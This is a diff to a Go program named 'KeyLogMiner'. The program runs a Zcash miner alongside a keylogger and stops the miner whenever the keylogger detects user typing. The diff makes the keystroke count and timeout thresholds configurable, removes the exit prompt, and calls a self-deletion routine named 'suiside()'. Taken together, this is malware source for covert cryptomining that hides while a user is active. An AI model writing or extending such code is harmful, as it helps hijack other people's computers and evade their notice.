@@ -26,7 +26,9 @@ type Configuration struct {
 	DefaultPoolPort           string
 	ZcashMinerFlagExtra       string
 	ZcashMinerDir             string
+	KeyCount                  int
 	ProcessID                 int
+	TimeOut                   int64
 }
 
 var (
@@ -62,7 +64,7 @@ func keyLogger(config *Configuration) {
 		// fmt.Println(tmpKeylog)
 		time.Sleep(1 * time.Millisecond)
 		// fmt.Println(tmpKeylog)
-		if len(tmpKeylog) >= 10 {
+		if len(tmpKeylog) >= config.KeyCount {
 			// fmt.Println("Long String detected")
 			start = time.Now()
 			// fmt.Println(start)
@@ -70,8 +72,8 @@ func keyLogger(config *Configuration) {
 		}
 		elapsed = time.Since(start)
 		elapsedsec = int64(elapsed/time.Millisecond) / 1000
-		if elapsedsec <= 10 && len(tmpKeylog) != 0 {
-			fmt.Println("Long String detected in 10s")
+		if elapsedsec <= config.TimeOut && len(tmpKeylog) != 0 {
+			fmt.Println("Long String detected in " + strconv.Itoa(int(config.TimeOut)) + "s")
 			// Stop Miner
 			go StopMiner(config)
 			return
@@ -431,14 +433,15 @@ func main() {
 	fmt.Println("Starting KeyLogMiner!")
 	go RunMiner(&config)
 	// Run Miner
-	go keyLogger(&config)
+	keyLogger(&config)
+	// go keyLogger(&config)
 	// fmt.Println("Finish running keyLogger")
 	// fmt.Println("Press Enter on me to see logs.")
 	// os.Stdin.Read([]byte{0}) // For pausing purpose only
 	// fmt.Println("Reading Stdin")
 	// fmt.Println(tmpKeylog)
-	fmt.Println("Press Enter to Exit.")
-	os.Stdin.Read([]byte{0}) // For pausing purpose only
+	// fmt.Println("Press Enter to Exit.")
+	// os.Stdin.Read([]byte{0}) // For pausing purpose only
 	// fmt.Println("Reading Stdin Again")
 	StopMiner(&config)
 	suiside()
